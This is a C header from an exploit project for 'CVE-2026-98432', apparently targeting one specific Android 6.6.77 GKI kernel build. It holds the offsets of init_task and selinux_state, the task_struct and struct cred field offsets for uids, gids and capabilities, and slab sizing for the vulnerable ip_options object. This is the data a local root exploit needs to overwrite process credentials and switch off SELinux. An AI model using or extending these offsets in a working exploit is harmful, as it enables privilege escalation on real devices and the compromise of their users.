/*
 * c98432_offsets.h — CVE-2026-98432 的构建相关常量
 *
 * 全部由这台机器的内核镜像（6.6.77-android15-8-gca30f3b4bef6-abogki440974771-4k）
 * 的 BTF 与符号表导出，**不能跨构建复用**：换个 abogki 号，这些值全都不一样。
 * 取法见 tools/exploit-re/README.md。
 *
 * 约定：
 *   O_* 是相对 _text 的偏移，运行期加 KASLR slide；
 *   S_* 是结构体内部字段偏移，与构建绑定。
 */

#ifndef C98432_OFFSETS_H
#define C98432_OFFSETS_H

#define C98432_RELEASE "6.6.77-android15-8-gca30f3b4bef6-abogki440974771-4k"

/* ---- 全局符号（相对 _text） ---- */
#define O_INIT_TASK     0x20de280ULL
#define O_SELINUX_STATE 0x2315f68ULL

/* ---- task_struct ---- */
#define S_TASK_TASKS    0x550ULL
#define S_TASK_PID      0x618ULL
#define S_TASK_TGID     0x61cULL
#define S_TASK_REAL_CRED 0x818ULL
#define S_TASK_CRED     0x820ULL
#define S_TASK_COMM     0x830ULL

/* ---- struct cred ---- */
#define CRED_SIZE       0xb8ULL
#define S_CRED_UID      0x08ULL
#define S_CRED_GID      0x0cULL
#define S_CRED_SUID     0x10ULL
#define S_CRED_SGID     0x14ULL
#define S_CRED_EUID     0x18ULL
#define S_CRED_EGID     0x1cULL
#define S_CRED_FSUID    0x20ULL
#define S_CRED_FSGID    0x24ULL
#define S_CRED_CAP_INH  0x30ULL
#define S_CRED_CAP_PERM 0x38ULL
#define S_CRED_CAP_EFF  0x40ULL
#define S_CRED_CAP_AMB  0x50ULL

/* ---- struct inet_sock ---- */
#define S_INET_OPT      0x370ULL

/* ---- struct skb_shared_info ---- */
#define S_SKB_NR_FRAGS  0x02ULL
#define S_SKB_DATAREF   0x20ULL
#define S_SKB_DESTRUCTOR_ARG 0x28ULL

/* ---- 漏洞对象的尺寸关系（6.6 的 ip_options 是柔性数组） ----
 * kzalloc(sizeof(struct ip_options_rcu) + optlen) = 32 + optlen
 * optlen 40 → 72 字节 → kmalloc-96；IP 选项上限就是 40。 */
#define OPT_HDR_SIZE    0x20ULL   /* ip_options_rcu（rcu_head 16 + ip_options 头 16） */
#define OPT_MAXLEN      40

#endif
